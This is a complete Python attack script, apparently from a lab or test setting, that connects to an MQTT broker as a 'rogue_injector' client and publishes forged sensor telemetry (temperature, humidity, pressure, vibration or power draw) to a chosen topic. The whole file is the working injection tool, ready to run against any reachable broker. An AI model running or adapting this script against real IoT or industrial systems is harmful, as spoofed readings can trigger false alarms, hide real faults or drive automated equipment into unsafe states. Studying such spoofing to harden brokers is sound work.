import paho.mqtt.client as mqtt
import time
import json
import argparse

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to broker!")
    else:
        print(f"Failed to connect, return code {rc}")

# Module-level parser for testing
parser = argparse.ArgumentParser(description="MQTT Fake Telemetry Injection")
parser.add_argument("--broker", required=True, help="MQTT Broker IP/Hostname")
parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
parser.add_argument("--topic", default="sensors/data", help="Target topic")
parser.add_argument("--sensor-type", default="temperature", help="Sensor type for payload key (temperature, humidity, pressure, vibration, power_draw)")
parser.add_argument("--value", type=int, default=9000, help="Fake sensor value to inject")

SENSOR_TYPE_MAP = {
    "temperature": "temp",
    "humidity": "humidity",
    "pressure": "pressure",
    "vibration": "vibration",
    "power_draw": "power_draw",
}

if __name__ == "__main__":
    args = parser.parse_args()
    
    client = mqtt.Client("rogue_injector")
    client.on_connect = on_connect
    
    print(f"Connecting to {args.broker}:{args.port}...")
    client.connect(args.broker, args.port, 60)
    client.loop_start()
    
    time.sleep(1) # wait for connection
    
    sensor_key = SENSOR_TYPE_MAP.get(args.sensor_type, "temp")
    payload = {"fake_injection": True}
    for key in ["temp", "humidity", "pressure", "vibration", "power_draw"]:
        payload[key] = args.value if key == sensor_key else 0.0
    payload_str = json.dumps(payload)
    print(f"Injecting malicious payload to '{args.topic}': {payload_str}")
    
    client.publish(args.topic, payload_str, qos=1)
    
    time.sleep(1)
    client.loop_stop()
    client.disconnect()
    print("Injection complete.")